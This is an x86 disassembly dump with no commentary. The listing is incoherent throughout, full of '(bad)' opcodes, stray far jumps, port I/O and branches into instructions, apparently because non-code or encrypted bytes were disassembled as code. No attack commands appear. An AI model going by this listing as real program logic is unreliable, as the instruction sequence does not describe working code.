  41b081:	and    al,0x25
  41b083:	cmp    DWORD PTR [edi],esp
  41b085:	sbb    al,0x7c
  41b087:	mov    ebp,0x720166f2
  41b08c:	(bad)
  41b08f:	or     esi,DWORD PTR [eax]
  41b091:	nop
  41b092:	sub    dl,BYTE PTR [ebx+0x1a76583b]
  41b098:	call   0x96ba:0x8b087442
  41b09f:	or     edi,ebx
  41b0a1:	xchg   esp,eax
  41b0a2:	inc    BYTE PTR [ebp+0x5e]
  41b0a5:	xchg   bl,dl
  41b0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0a8:	fwait
  41b0a9:	cmp    ebp,edx
  41b0ab:	sub    DWORD PTR [edi],0xffffffbd
  41b0ae:	sbb    al,0xfe
  41b0b0:	and    BYTE PTR [ecx+edx*8],0x20
  41b0b4:	push   ds
  41b0b5:	mov    ecx,0xe2cf3d80
  41b0ba:	int3   
  41b0bb:	aad    0x35
  41b0bd:	mov    ds:0x64e52e72,al
  41b0c2:	push   ecx
  41b0c3:	cmc    
  41b0c4:	mov    ecx,es
  41b0c6:	es jmp 0x1bcc2cf6
  41b0cc:	popa   
  41b0cd:	mov    bh,0xb9
  41b0cf:	ins    BYTE PTR es:[edi],dx
  41b0d0:	mov    WORD PTR [edx+0x5b406cb8],?
  41b0d6:	outs   dx,BYTE PTR ds:[esi]
  41b0d7:	mov    ch,0x7
  41b0d9:	pop    eax
  41b0da:	mov    eax,0x5c1bc853
  41b0df:	repz sub dl,BYTE PTR [ebx]
  41b0e2:	jbe    0x41b07e
  41b0e4:	mov    dh,dl
  41b0e6:	enter  0x64af,0x14
  41b0ea:	cwde   
  41b0eb:	cs clc 
  41b0ed:	ret    
  41b0ee:	pop    edx
  41b0ef:	push   ebx
  41b0f0:	into   
  41b0f1:	(bad)  
  41b0f2:	loope  0x41b084
  41b0f4:	hlt    
  41b0f5:	mov    bl,0xc3
  41b0f7:	sub    esp,ecx
  41b0f9:	xor    DWORD PTR [ecx],0xfffffff9
  41b0fc:	and    BYTE PTR [ebx],ch
  41b0fe:	pop    esp
  41b0ff:	adc    eax,0x9af436f
  41b104:	aaa    
  41b105:	pop    es
  41b106:	and    ecx,DWORD PTR [edx]
  41b108:	lods   al,BYTE PTR ds:[esi]
  41b109:	mov    BYTE PTR [edi-0x2ffeb5a7],al
  41b10f:	mov    bl,0xf
  41b111:	jbe    0x41b14a
  41b113:	stc    
  41b114:	add    cl,al
  41b116:	pop    ds
  41b117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b118:	or     edx,DWORD PTR [ecx+0x69]
  41b11b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41b11d:	scas   al,BYTE PTR es:[edi]
  41b11e:	mov    edi,0xc1cad1b4
  41b123:	mov    dh,0x92
  41b125:	test   DWORD PTR [eax-0x5f],esi
  41b128:	pop    ebp
  41b129:	fbld   TBYTE PTR [ecx+0x5d]
  41b12c:	xchg   ecx,eax
  41b12d:	mov    esp,0x91836f55
  41b132:	xor    BYTE PTR [esi],ah
  41b134:	jo     0x41b165
  41b136:	sete   BYTE PTR [edi+0x1c]
  41b13a:	xchg   esp,eax
  41b13b:	inc    ebx
  41b13c:	jp     0x41b0e7
  41b13e:	ins    DWORD PTR es:[edi],dx
  41b13f:	pop    esi
  41b140:	sub    edi,DWORD PTR [edi]
  41b142:	aaa    
  41b143:	arpl   WORD PTR [eax-0x43],si
  41b146:	enter  0x79f8,0x40
  41b14a:	mov    ah,0x9e
  41b14c:	fidivr DWORD PTR [ebx-0x51]
  41b14f:	xchg   edi,eax
  41b150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b151:	adc    ebx,ecx
  41b153:	jns    0x41b176
  41b155:	jle    0x41b12b
  41b157:	jg     0x41b161
  41b159:	cli    
  41b15a:	jo     0x41b168
  41b15c:	pop    ebp
  41b15d:	js     0x41b0e7
  41b15f:	ud0    ecx,edx
  41b162:	inc    esi
  41b163:	cs mov eax,0x6eed2702
  41b169:	loopne 0x41b173
  41b16b:	cmp    ecx,esi
  41b16d:	sub    dl,BYTE PTR [ebp*4+0x59205f30]
  41b174:	mov    BYTE PTR [ecx-0x3ae0d47b],bh
  41b17a:	repnz adc eax,0x88c433a0
  41b180:	jecxz  0x41b1b1
  41b182:	cmp    eax,0x9d30df5e
  41b187:	into   
  41b188:	inc    BYTE PTR [ecx-0x53]
  41b18b:	cli    
  41b18c:	push   ss
  41b18d:	shl    DWORD PTR [esi],1
  41b18f:	jp     0x41b16f
  41b191:	fadd   DWORD PTR [eax]
  41b193:	call   0xa4c63ecc
  41b198:	in     al,dx
  41b199:	mov    esi,eax
  41b19b:	add    eax,0x679a052d
  41b1a0:	mov    dh,0x57
  41b1a2:	mov    eax,ds:0x2444a535
  41b1a7:	pop    ss
  41b1a8:	in     eax,dx
  41b1a9:	dec    ecx
  41b1aa:	dec    esi
  41b1ab:	sbb    al,BYTE PTR [edx]
  41b1ad:	repnz push dx
  41b1b0:	add    esp,esp
  41b1b2:	je     0x41b136
  41b1b4:	xor    eax,0x7f418592
  41b1b9:	sbb    ch,BYTE PTR [edi*4+0x4134a84b]
  41b1c0:	pop    esi
  41b1c1:	cli    
  41b1c2:	cld    
  41b1c3:	pop    ss
  41b1c4:	xor    eax,0x19be8877
  41b1c9:	push   ds
  41b1ca:	cmc    
  41b1cb:	jmp    0x8e44:0x3c51511
  41b1d2:	pop    esp
  41b1d3:	stc    
  41b1d4:	pop    edx
  41b1d5:	add    esp,DWORD PTR [esi+0x13a22166]
  41b1db:	int    0xf
  41b1dd:	int    0xfb
  41b1df:	or     al,al
  41b1e1:	adc    dh,BYTE PTR [eax]
  41b1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1e4:	cdq    
  41b1e5:	fld    QWORD PTR [ebx]
  41b1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e8:	xchg   esi,eax
  41b1e9:	bound  ebp,QWORD PTR [esi-0x3717eedc]
  41b1ef:	lods   eax,DWORD PTR ds:[esi]
  41b1f0:	xchg   edx,eax
  41b1f1:	js     0x41b1d6
  41b1f3:	icebp  
  41b1f4:	xor    BYTE PTR [edx],0xbf
  41b1f7:	fdivr  DWORD PTR [ebp-0x3f552c8f]
  41b1fd:	mov    esi,0x53570ec7
  41b202:	pop    edx
  41b203:	or     al,0x74
  41b205:	pop    ebx
  41b206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b207:	push   ds
  41b208:	loopne 0x41b272
  41b20a:	sbb    bl,BYTE PTR [esi+0x4b]
  41b20d:	cmp    dh,bh
  41b20f:	iret   
  41b210:	mov    ch,BYTE PTR [edx-0x6c]
  41b213:	push   ss
  41b214:	xchg   edx,eax
  41b215:	inc    eax
  41b216:	xchg   esi,eax
  41b217:	or     eax,0xb9940888
  41b21c:	add    al,0xa5
  41b21e:	or     ch,BYTE PTR [ebp+0x67da67b9]
  41b224:	rcl    DWORD PTR [esi-0x5fd53151],1
  41b22a:	fisub  WORD PTR [edx-0x1a]
  41b22d:	nop
  41b22e:	xor    edi,ebp
  41b230:	mov    ds:0xb262da9c,al
  41b235:	jge    0x41b271
  41b237:	jo     0x41b221
  41b239:	mov    dh,0x64
  41b23b:	and    eax,0xa135afe
  41b240:	add    ebx,DWORD PTR [edi+0x77]
  41b243:	or     bl,BYTE PTR [esi-0x66911691]
  41b249:	call   0xa8e1:0x55bd44f1
  41b250:	leave  
  41b251:	xor    eax,0x4d50a2cf
  41b256:	sub    al,0x56
  41b258:	leave  
  41b259:	and    eax,0x303ad32f
  41b25e:	dec    edx
  41b25f:	push   0xadf9b0c
  41b264:	sbb    ah,BYTE PTR [edx]
  41b266:	out    dx,al
  41b267:	mov    ebp,ecx
  41b269:	stos   BYTE PTR es:[edi],al
  41b26a:	js     0x41b242
  41b26c:	scas   eax,DWORD PTR es:[edi]
  41b26d:	xchg   esp,eax
  41b26e:	pop    esp
  41b26f:	push   0x8a9c7462
  41b274:	pop    esp
  41b275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b276:	stos   DWORD PTR es:[edi],eax
  41b277:	cmp    BYTE PTR [ebx+edi*8-0x3],cl
  41b27b:	mov    al,0x14
  41b27d:	dec    esp
  41b27e:	rol    BYTE PTR [edi+ebx*8-0xf30601a],0x14
  41b286:	sti    
  41b287:	push   es
  41b288:	cli    
  41b289:	push   esp
  41b28a:	mov    eax,ds:0xd566783e
  41b28f:	cmp    cl,BYTE PTR [ecx-0x34]
  41b292:	push   eax
  41b293:	adc    BYTE PTR [ebx],bl
  41b295:	mov    esi,DWORD PTR [eax+esi*1+0x40]
  41b299:	ja     0x41b274
  41b29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29c:	call   0xaa420793
  41b2a1:	jmp    0x9dc0:0xdab1056e
  41b2a8:	popa   
  41b2a9:	xor    al,0x2d
  41b2ab:	cmp    eax,0x518bd3d
  41b2b0:	sbb    BYTE PTR [edx-0x15acaaee],ch
  41b2b6:	jne    0x41b2db
  41b2b8:	into   
  41b2b9:	sbb    dl,al
  41b2bb:	push   ebp
  41b2bc:	or     cl,ch
  41b2be:	enter  0x8ad9,0x6c
  41b2c2:	loope  0x41b2e3
  41b2c4:	mov    cl,al
  41b2c6:	sbb    DWORD PTR [ebp-0x21eed46d],esp
  41b2cc:	lea    edi,[edi]
  41b2ce:	or     BYTE PTR [bp+di+0x15],dh
  41b2d2:	clc    
  41b2d3:	pop    ss
  41b2d4:	(bad)  
  41b2d5:	dec    esp
  41b2d6:	mov    edi,0x31f6c0fb
  41b2db:	add    ch,BYTE PTR [esi]
  41b2dd:	adc    dh,dl
  41b2df:	cld    
  41b2e0:	mov    ds:0xcbeac8b9,eax
  41b2e5:	out    dx,eax
  41b2e6:	mov    al,0x38
  41b2e8:	xor    BYTE PTR [eax],0x1
  41b2eb:	sub    DWORD PTR [edx+0x15342bb8],edi
  41b2f1:	jle    0x41b340
  41b2f3:	push   edx
  41b2f4:	in     eax,0xcd
  41b2f6:	icebp  
  41b2f7:	pop    esp
  41b2f8:	(bad)  
  41b2f9:	push   edi
  41b2fa:	in     al,0x1
  41b2fc:	jecxz  0x41b307
  41b2fe:	jl     0x41b313
  41b300:	jae    0x41b323
  41b302:	arpl   WORD PTR [edx+0x209098a5],cx
  41b308:	lea    esp,[ecx+0x5ad26d42]
  41b30e:	fdivr  QWORD PTR [eax-0x2c]
  41b311:	jne    0x41b2a6
  41b313:	or     edi,DWORD PTR [edx-0x227a866c]
  41b319:	push   0x7feb29ec
  41b31e:	jnp    0x41b399
  41b320:	push   esp
  41b321:	jbe    0x41b2f3
  41b323:	or     ah,BYTE PTR ds:0xc08b46c3
  41b329:	jmp    0x2db4:0x96390f3c
  41b330:	(bad)  
  41b331:	push   ebp
  41b332:	call   0xdbd573ea
  41b337:	and    BYTE PTR ds:[eax-0x2b3115f9],0x16
  41b33f:	mov    ebp,0xa4d78f51
  41b344:	cmc    
  41b345:	lods   al,BYTE PTR ds:[esi]
  41b346:	jle    0x41b2e1
  41b348:	es pop ds
  41b34a:	push   ebx
  41b34b:	add    dl,BYTE PTR [edi]
  41b34d:	(bad)  
  41b34e:	push   DWORD PTR [ecx-0x379c8563]
  41b354:	retf   0x29ab
  41b357:	or     DWORD PTR [ecx],0x75
  41b35a:	xlat   BYTE PTR ds:[ebx]
  41b35b:	or     ah,BYTE PTR [eax+0x60]
  41b35e:	inc    esp
  41b35f:	or     eax,ecx
  41b361:	dec    esp
  41b362:	xor    ebp,DWORD PTR [edi]
  41b364:	dec    ebp
  41b365:	call   0x7eb1:0xcb5837e2
  41b36c:	lods   eax,DWORD PTR ds:[esi]
  41b36d:	jmp    0xfa05:0x57c85f4f
  41b374:	jmp    0x8b0a:0x5a272deb
  41b37b:	imul   esp,ebx,0x3
  41b37e:	inc    esi
  41b37f:	pop    esi
  41b380:	mov    ebx,0xeef95bfd
  41b385:	in     eax,dx
  41b386:	lahf   
  41b387:	dec    ecx
  41b388:	in     eax,dx
  41b389:	jle    0x41b384
  41b38b:	xor    al,0xe
  41b38d:	fisttp WORD PTR [edi-0x2b]
  41b390:	xor    esp,DWORD PTR [edx-0x5544bf26]
  41b396:	jns    0x41b34c
  41b398:	or     dh,BYTE PTR [edi+0x38bfe729]
  41b39e:	loop   0x41b40a
  41b3a0:	in     al,dx
  41b3a1:	out    dx,eax
  41b3a2:	mov    ch,0xee
  41b3a4:	sub    edi,ecx
  41b3a6:	mov    eax,0xc6f3d6ce
  41b3ab:	ja     0x41b392
  41b3ad:	mov    DWORD PTR [eax+0x3b],0xa9cbdb07
  41b3b4:	or     al,0x1e
  41b3b6:	push   cs
  41b3b7:	cvtpi2ps xmm5,mm4
  41b3ba:	jns    0x41b439
  41b3bc:	sar    ah,1
  41b3be:	xor    BYTE PTR [esi+edx*2],al
  41b3c1:	dec    ecx
  41b3c2:	popf   
  41b3c3:	push   esp
  41b3c4:	and    al,0xfb
  41b3c6:	pop    es
  41b3c7:	ror    DWORD PTR [ebx+0x24],cl
  41b3ca:	in     al,0x91
  41b3cc:	sahf   
  41b3cd:	xor    ch,BYTE PTR [eax]
  41b3cf:	pop    edi
  41b3d0:	pop    esp
  41b3d1:	or     ebx,DWORD PTR [edi-0x768a06ff]
  41b3d7:	int    0x83
  41b3d9:	ret    0xed74
  41b3dc:	mov    ds:0xefdbf9e8,al
  41b3e1:	or     DWORD PTR ss:[ecx],esp
  41b3e4:	dec    ebp
  41b3e5:	mov    ds:0xf33a9c31,al
  41b3ea:	jne    0x41b45d
  41b3ec:	jecxz  0x41b389
  41b3ee:	retf   
  41b3ef:	mov    ch,0x6
  41b3f1:	push   ebx
  41b3f2:	cmc    
  41b3f3:	mov    cl,0xb7
  41b3f5:	dec    esi
  41b3f6:	adc    DWORD PTR [esi-0x46],ebp
  41b3f9:	xor    eax,0xfd7e26d3
  41b3fe:	cmp    eax,0x89ba35d1
  41b403:	das    
  41b404:	mov    WORD PTR [ecx+0x1330faf0],fs
  41b40a:	jle    0x41b446
  41b40c:	jns    0x41b40e
  41b40e:	call   0x91a2:0x3098969b
  41b415:	xchg   edx,eax
  41b416:	sar    DWORD PTR [ecx],0xfa
  41b419:	lods   eax,DWORD PTR ds:[esi]
  41b41a:	or     BYTE PTR [edi],0xb9
  41b41d:	sar    BYTE PTR [ebp+edi*4-0x66],cl
  41b421:	pop    edi
  41b422:	std    
  41b423:	xor    al,BYTE PTR [eax]
  41b425:	xchg   esi,eax
  41b426:	dec    eax
  41b427:	addr16 pop ebx
  41b429:	icebp  
  41b42a:	daa    
  41b42b:	mov    dl,0x15
  41b42d:	dec    edx
  41b42e:	mov    edi,0x4170429
  41b433:	scas   eax,DWORD PTR es:[edi]
  41b434:	les    esp,FWORD PTR [edx+0x3b]
  41b437:	lock imul edx,DWORD PTR fs:[esi+0x61aeffa9],0x13
  41b440:	and    ah,BYTE PTR [bx-0x68b6]
  41b445:	and    eax,0x42207c85
  41b44a:	dec    edx
  41b44b:	sar    DWORD PTR [ebx],cl
  41b44d:	fidiv  WORD PTR [ecx]
  41b44f:	scas   al,BYTE PTR es:[edi]
  41b450:	out    0x84,al
  41b452:	mov    ebp,0xe6276799
  41b457:	pop    eax
  41b458:	fdiv   QWORD PTR [esi+0x3]
  41b45b:	mov    ecx,0x6e21a347
  41b460:	or     al,0x46
  41b462:	pusha  
  41b463:	ror    BYTE PTR [eax+0xa3],cl
	...
  41b641:	add    bl,ah
  41b643:	pop    ds
  41b644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b645:	adc    al,0xfe
  41b647:	mov    ebp,0x9faffff3
  41b64c:	test   ah,0xff
  41b64f:	push   0x37761f9a
  41b654:	add    DWORD PTR [eax],eax
  41b656:	and    eax,0x49000007
  41b65b:	mov    al,0x93
  41b65d:	and    cl,BYTE PTR [eax]
  41b65f:	mov    al,0x45
  41b661:	push   ss
  41b662:	push   ebx
  41b663:	cwde   
  41b664:	mov    esi,0x975fc4
  41b669:	jg     0x41b678
  41b66b:	xchg   BYTE PTR [esi],bl
  41b66d:	outs   dx,DWORD PTR ds:[esi]
  41b66e:	sbb    ebp,DWORD PTR [edi]
  41b670:	sti    
  41b671:	loope  0x41b690
  41b673:	xchg   edi,eax
  41b674:	pop    esp
  41b675:	mov    ah,0xdf
  41b677:	scas   al,BYTE PTR es:[edi]
  41b678:	dec    edx
  41b679:	leave  
  41b67a:	xor    al,0xcb
  41b67c:	mov    al,ds:0x7b81b448
  41b681:	dec    eax
  41b682:	lea    eax,[edi-0x4d0356e3]
  41b688:	jecxz  0x41b6a7
  41b68a:	or     DWORD PTR [ecx+0x54],ebp
  41b68d:	pop    ebp
  41b68e:	iret   
  41b68f:	fstp   QWORD PTR [ebp-0x55]
  41b692:	ret    
  41b693:	add    bh,BYTE PTR [eax+0x6d95817b]
  41b699:	out    0x1a,al
  41b69b:	and    eax,0x13fd7fae
  41b6a0:	sub    eax,0x76d0478a
  41b6a5:	fld    TBYTE PTR ds:0xe48cff80
  41b6ab:	adc    DWORD PTR [edi-0x8],esi
  41b6ae:	sub    eax,DWORD PTR [edi+0x797ede7e]
  41b6b4:	dec    ebp
  41b6b5:	in     eax,dx
  41b6b6:	xchg   esp,eax
  41b6b7:	(bad)  
  41b6b9:	ss iret 
  41b6bb:	test   eax,0xd427f29f
  41b6c0:	jne    0x41b72e
  41b6c2:	inc    esi
  41b6c3:	(bad)  
  41b6c4:	cmp    cl,dh
  41b6c6:	mov    al,ds:0x74235502
  41b6cb:	clc    
  41b6cc:	push   ebx
  41b6cd:	jmp    0xeb5022fd
  41b6d2:	out    dx,eax
  41b6d3:	ins    DWORD PTR es:[edi],dx
  41b6d4:	imul   edx,DWORD PTR [esi],0xd38db62f
  41b6da:	or     bh,BYTE PTR [esi]
  41b6dc:	and    DWORD PTR [eax],ebx
  41b6de:	inc    edx
  41b6df:	cmp    dh,BYTE PTR [edx+0x5630754c]
  41b6e5:	add    edi,DWORD PTR [esp+edx*1-0x3f376e9e]
  41b6ec:	sar    DWORD PTR [esi-0x17],cl
  41b6ef:	ds repnz pop es
  41b6f2:	mov    ecx,0x29f56b9a
  41b6f7:	ror    DWORD PTR [edx],cl
  41b6f9:	icebp  
  41b6fa:	cmp    eax,0x2f6e024a
  41b6ff:	outs   dx,DWORD PTR ds:[esi]
  41b700:	jae    0x41b6ac
  41b702:	sub    edi,DWORD PTR [ebx*2+0x55e13d4f]
  41b709:	stc    
  41b70a:	cmp    ebx,esp
  41b70c:	cmp    al,0xca
  41b70e:	mov    esp,0x6fc333ac
  41b713:	jnp    0x41b6fa
  41b715:	jecxz  0x41b719
  41b717:	sar    BYTE PTR [edx+0x3d],0x5d
  41b71b:	cmp    BYTE PTR [edi-0x40],dl
  41b71e:	outs   dx,DWORD PTR ds:[esi]
  41b71f:	retf   0x988d
  41b722:	popa   
  41b723:	fsubr  DWORD PTR [edx+0x3174c9d0]
  41b729:	test   DWORD PTR [edx],ebp
  41b72b:	adc    BYTE PTR [edi-0x7696ee10],0xf8
  41b732:	fwait
  41b733:	ror    BYTE PTR [edi+esi*2-0x29],cl
  41b737:	pop    ebx
  41b738:	sbb    BYTE PTR [ebx+0x3394a742],bh
  41b73e:	adc    eax,0xe31d3d8b
  41b743:	or     eax,ebx
  41b745:	les    eax,FWORD PTR [eax+0x64]
  41b748:	mov    ebx,0x2d513974
  41b74d:	mov    ch,0xf3
  41b74f:	inc    ebp
  41b750:	shr    BYTE PTR [ecx-0x67],1
  41b753:	inc    ebx
  41b754:	inc    ecx
  41b755:	test   BYTE PTR [edi-0x3b1834aa],0x20
  41b75c:	and    bh,BYTE PTR [edx-0xe20a683]
  41b762:	mov    dh,0x37
  41b764:	(bad)  
  41b765:	sub    eax,0x197d77c
  41b76a:	shl    BYTE PTR [eax],cl
  41b76c:	rcr    DWORD PTR [edx+0x2fb897e0],0xa1
  41b773:	xchg   ah,cl
  41b775:	int    0xf9
  41b777:	jge    0x41b74b
  41b779:	stos   BYTE PTR es:[edi],al
  41b77a:	cdq    
  41b77b:	(bad)  
  41b77c:	cdq    
  41b77d:	idiv   esp
  41b77f:	in     eax,0x95
  41b781:	jmp    0x5e41:0xf0a133a1
  41b788:	out    0x55,eax
  41b78a:	adc    al,BYTE PTR ds:0x35f873fb
  41b790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b791:	add    cl,BYTE PTR [edx]
  41b793:	paddb  mm7,mm4
  41b796:	pop    edi
  41b797:	jle    0x41b807
  41b799:	fwait
  41b79a:	push   ebp
  41b79b:	imul   edi
  41b79d:	imul   edx,esi,0x9bcdfb94
  41b7a3:	test   BYTE PTR [esi-0x7d2a8a36],dl
  41b7a9:	icebp  
  41b7aa:	lock int3 
  41b7ac:	repz (bad) 
  41b7af:	pop    esp
  41b7b0:	cmp    ch,BYTE PTR [edx+0x34727568]
  41b7b6:	jno    0x41b819
  41b7b8:	inc    esp
  41b7b9:	jle    0x41b77e
  41b7bb:	aad    0x10
  41b7bd:	or     BYTE PTR [ecx],bh
  41b7bf:	out    0x30,eax
  41b7c1:	push   esp
  41b7c2:	lods   al,BYTE PTR ds:[esi]
  41b7c3:	data16 and dh,BYTE PTR [edx]
  41b7c6:	xor    bh,dl
  41b7c8:	iret   
  41b7c9:	lods   al,BYTE PTR ds:[esi]
  41b7ca:	jae    0x41b7b9
  41b7cc:	push   esi
  41b7cd:	imul   edx,DWORD PTR [ebx+0x67d1c174],0x9755d620
  41b7d7:	(bad)  [ebx-0x1f]
  41b7da:	jg     0x41b821
  41b7dc:	mov    bl,BYTE PTR [ebp-0x199caeb3]
  41b7e2:	in     al,dx
  41b7e3:	sub    eax,0x1fec35f1
  41b7e8:	fcomp  DWORD PTR ds:0x77e03bc0
  41b7ee:	stos   DWORD PTR es:[edi],eax
  41b7ef:	cmc    
  41b7f0:	inc    ecx
  41b7f1:	xlat   BYTE PTR ds:[ebx]
  41b7f2:	bound  eax,QWORD PTR [edi]
  41b7f4:	cli    
  41b7f5:	jmp    0x41b86e
  41b7f7:	ja     0x41b7f5
  41b7f9:	adc    al,0x63
  41b7fb:	push   ds
  41b7fc:	mov    ecx,0xb9fcda79
  41b801:	scas   eax,DWORD PTR es:[edi]
  41b802:	push   ss
  41b803:	xchg   edx,eax
  41b804:	xor    eax,0x5947fdd5
  41b809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b80a:	mov    esi,DWORD PTR [ebx+0x28]
  41b80d:	fcomip st,st(3)
  41b80f:	mov    ebx,0x85d647c
  41b814:	push   cs
  41b815:	mov    cl,0xe8
  41b817:	jle    0x41b7fd
  41b819:	add    BYTE PTR [edx+ebx*1+0x27],0x1f
  41b81e:	jae    0x41b883
  41b820:	add    edx,ecx
  41b822:	xor    ebp,DWORD PTR [edi+0x18d0b1d1]
  41b828:	sbb    DWORD PTR [edx],ebp
  41b82a:	jge    0x41b7ad
  41b82c:	sbb    eax,0xd8c7869d
  41b831:	xor    esp,edi
  41b833:	adc    eax,0xb6a08d0d
  41b838:	retf   0xb3a0
  41b83b:	mov    ah,0x37
  41b83d:	mov    esi,0x1b053509
  41b842:	in     al,dx
  41b843:	icebp  
  41b844:	adc    DWORD PTR [edi-0x5b2ba4cf],eax
  41b84a:	sub    eax,DWORD PTR [esi]
  41b84c:	lahf   
  41b84d:	pusha  
  41b84e:	jecxz  0x41b842
  41b850:	cs sub al,0x81
  41b853:	push   eax
  41b854:	pop    ebx
  41b855:	in     al,0x60
  41b857:	sahf   
  41b858:	add    DWORD PTR [edx-0x39574dd5],eax
  41b85e:	push   0x6fc2bf1b
  41b863:	mov    fs,WORD PTR [ecx]
  41b865:	fiadd  WORD PTR [edx]
  41b867:	xchg   DWORD PTR [edi+0x73],eax
  41b86a:	pop    ebx
  41b86b:	jp     0x41b822
  41b86d:	or     edx,DWORD PTR [eiz*8+0x1c0042d8]
  41b874:	fadd   DWORD PTR [edi]
  41b876:	rcl    dh,1
  41b878:	push   es
  41b879:	fs push 0x54bdf91d
  41b87f:	mov    bl,0x46
  41b881:	mov    eax,ds:0x9a9c672
  41b886:	scas   al,BYTE PTR es:[edi]
  41b887:	aas    
  41b888:	cs mov bh,0xf3
  41b88b:	loopne 0x41b86a
  41b88d:	mov    dh,0xde
  41b88f:	test   eax,0x803d0220
  41b894:	in     eax,dx
  41b895:	cwde   
  41b896:	(bad)  
  41b897:	js     0x41b8b3
  41b899:	mov    edx,0x67bf4e3e
  41b89e:	push   esi
  41b89f:	jne    0x41b85b
  41b8a1:	aad    0x70
  41b8a3:	mov    BYTE PTR [esi-0x59],ch
  41b8a6:	adc    BYTE PTR [ebx-0x70e37041],ch
  41b8ac:	sbb    edi,DWORD PTR [edi-0x7b]
  41b8af:	rcl    BYTE PTR [ebp+0x59],0xc
  41b8b3:	mov    al,BYTE PTR [edx+0x1d]
  41b8b6:	test   bh,bh
  41b8b8:	add    BYTE PTR [ecx],bh
  41b8ba:	ss jb  0x41b913
  41b8bd:	cmp    DWORD PTR [eax],0x5310e7c3
  41b8c3:	mov    ecx,esi
  41b8c5:	(bad)  
  41b8c6:	call   0x4aec972d
  41b8cb:	data16 in al,dx
  41b8cd:	jmp    0xd8f8:0xedf30768
  41b8d4:	loop   0x41b8b9
  41b8d6:	jb     0x41b8cf
  41b8d8:	imul   eax,DWORD PTR [edi-0x2c],0x3b
  41b8dc:	push   es
  41b8dd:	jnp    0x41b879
  41b8df:	and    ch,cl
  41b8e1:	outs   dx,DWORD PTR ds:[esi]
  41b8e2:	mov    ch,0xc2
  41b8e4:	add    ch,BYTE PTR [ebx]
  41b8e6:	fwait
  41b8e7:	int    0x9c
  41b8e9:	jp     0x41b87b
  41b8eb:	mov    WORD PTR [eax-0x1b47f48c],ss
  41b8f1:	xchg   esp,esp
  41b8f3:	ss jmp 0x41b8e4
  41b8f6:	jnp    0x41b8af
  41b8f8:	test   eax,0x6a242596
  41b8fd:	push   ebx
  41b8fe:	sar    BYTE PTR [edi],cl
  41b900:	out    0x76,al
  41b902:	push   ebx
  41b903:	ror    bl,1
  41b905:	leave  
  41b906:	mov    bh,BYTE PTR [eax+eiz*1-0x7e]
  41b90a:	dec    esp
  41b90b:	stos   DWORD PTR es:[edi],eax
  41b90c:	daa    
  41b90d:	sub    ecx,0x52
  41b910:	sub    al,0x51
  41b912:	jae    0x41b904
  41b914:	loopne 0x41b900
  41b916:	scas   al,BYTE PTR es:[edi]
  41b917:	div    DWORD PTR [edi+eiz*4]
  41b91a:	mov    esp,0x76fbc60b
  41b91f:	inc    eax
  41b920:	(bad)  
  41b921:	daa    
  41b922:	or     bl,bh
  41b924:	fcmovb st,st(5)
  41b926:	jb     0x41b8f7
  41b928:	ficom  WORD PTR [ecx]
  41b92a:	ins    BYTE PTR es:[edi],dx
  41b92b:	shl    BYTE PTR [ecx],0x3
  41b92e:	in     al,dx
  41b92f:	inc    esi
  41b930:	add    eax,0xd2f01404
  41b935:	mov    bh,0x4e
  41b937:	jmp    0x41b933
  41b939:	mov    al,ds:0x9556a060
  41b93e:	xchg   ebp,eax
  41b93f:	mov    ch,0xf5
  41b941:	add    eax,0x4682aebb
  41b946:	les    eax,FWORD PTR [ebp-0x3a43efaf]
  41b94c:	cmp    BYTE PTR [ecx+0x5b],al
  41b94f:	(bad)  
  41b950:	cs cmc 
  41b952:	out    0xf7,eax
  41b954:	loop   0x41b906
  41b956:	mov    al,0xb4
  41b958:	icebp  
  41b959:	adc    cl,0xe1
  41b95c:	fst    QWORD PTR ds:0x4fff9aa2
  41b962:	add    dl,BYTE PTR [eax-0x68]
  41b965:	enter  0x5b3f,0x5b
  41b969:	jmp    0xacabd5e
  41b96e:	mov    ds:0x88127063,al
  41b973:	adc    edi,DWORD PTR [ebp+0x2972cb59]
  41b979:	aad    0x8
  41b97b:	mov    ds:0x200e0d6c,al
  41b980:	in     al,0x7f
  41b982:	cmp    eax,0x797d6ca9
  41b987:	add    eax,0xab028383
  41b98c:	int    0x8
  41b98e:	cdq    
  41b98f:	push   es
  41b990:	out    dx,al
  41b991:	pusha  
  41b992:	and    al,0x59
  41b994:	push   cs
  41b995:	inc    edx
  41b996:	xor    dl,BYTE PTR ds:0x7248b0eb
  41b99c:	cmp    esi,ebp
  41b99e:	out    dx,eax
  41b99f:	out    0x4,al
  41b9a1:	cmp    ecx,ebp
  41b9a3:	mov    al,0xe4
  41b9a5:	pop    ecx
  41b9a6:	cmp    eax,0xf4500b0a
  41b9ab:	cs je  0x41b964
  41b9ae:	dec    esi
  41b9af:	data16 fidivr DWORD PTR [ecx-0x22]
  41b9b3:	xchg   esp,eax
  41b9b4:	mov    BYTE PTR [ecx],dl
  41b9b6:	xchg   edi,eax
  41b9b7:	mov    edi,0xfba89813
  41b9bc:	xchg   edi,eax
  41b9bd:	test   DWORD PTR [ebx+edx*8-0x2c],esi
  41b9c1:	jmp    0x856021e6
  41b9c6:	pop    edi
  41b9c7:	jmp    0xc7d8:0x8d3bd672
  41b9ce:	mov    WORD PTR [esp+ebx*8+0x14],es
  41b9d2:	shr    DWORD PTR [ebx-0x6fa7e2df],cl
  41b9d8:	jnp    0x41b9b0
  41b9da:	push   edi
  41b9db:	and    eax,DWORD PTR [ebx]
  41b9dd:	sub    eax,0x838cb386
  41b9e2:	push   esp
  41b9e3:	js     0x41b9db
  41b9e5:	and    DWORD PTR [edx],eax
  41b9e7:	mov    ebp,0xbca5bd90
  41b9ec:	cmp    eax,0xfedeaa7
  41b9f1:	mov    esi,0x62422a1d
  41b9f6:	xchg   ecx,eax
  41b9f7:	jle    0x41ba01
  41b9f9:	cdq    
  41b9fa:	dec    ecx
  41b9fb:	inc    eax
